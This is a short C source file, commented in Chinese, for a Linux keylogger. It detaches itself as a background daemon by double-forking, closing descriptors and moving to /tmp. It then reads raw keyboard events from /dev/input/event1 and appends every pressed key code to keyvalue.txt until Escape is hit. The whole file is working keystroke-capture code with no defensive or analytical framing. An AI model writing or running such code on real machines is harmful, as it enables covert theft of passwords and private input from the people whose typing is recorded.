#include "definefile.h"
#include <linux/input.h>
//查看总线使用设备对应设备文件
//[root@localhost input]# proc/bus/input
//[root@localhost input]# cat devices
//守护进程提取用户键盘输入字符
int  openfile()
{
     int fd=open("keyvalue.txt",O_CREAT|O_EXCL|O_WRONLY,0777);
     if(errno==EEXIST)
     {
         fd=open("keyvalue.txt",O_WRONLY);
     }
     return fd;
}
void savetofile(int fd,char *ch)
{
    int len=write(fd,ch,strlen(ch));
}
void closefile(int fd)
{
    close(fd);
}
void  getkeypressvalue()
{
    int fd;
    int key_value,i=0,count;
    struct input_event event,press_event;
    fd = open("/dev/input/event1", O_RDWR);
    if (fd < 0)
   {
             perror("open device buttons:");
             exit(1);
    }
int savefd=openfile();
if (savefd < 0)
{
         perror("open save text:");
         exit(1);
}
char buf[100];
while(1)
       {
               if(read(fd, &event, sizeof(event)) == sizeof(event))
               {
                   if (event.type == EV_KEY)
                   {
                       if ( event.value == 1)
                       {
                           bzero(buf,sizeof(buf));
                           sprintf(buf,"%d prssed",event.code);
                            //   printf("key %d %s\n", event.code, (event.value) ? "Pressed" : "Released");
                            savetofile(savefd,buf);
                             if(event.code == KEY_ESC)
                                       break;
                       }
                 }
               }
       }
close(fd);
}

void init_daemon()
{
   int pid;
   int i;
   pid=fork();
   if(pid>0)//结束父进程
	  exit(0);
   else if(pid<0)
	  exit(1);
   setsid();//让第一个子进程成为进程组组长
   pid=fork();//取消子进程与控制终端 文件的关系,并且防止重新打开心的控制终端
   if(pid>0)//关闭第一个子进程
	  exit(0);
   else if(pid<0)
	  exit(1);
   //关闭所有文件
   //是代表最大文件打开数
   for(i=0;i<1024;i++)
   {
	   close(i);
   }
   chdir("/tmp");//改变工作目录
   umask(0);//改变掩码
}

int main(void)
{
    init_daemon();
    getkeypressvalue();
    return 0;
}
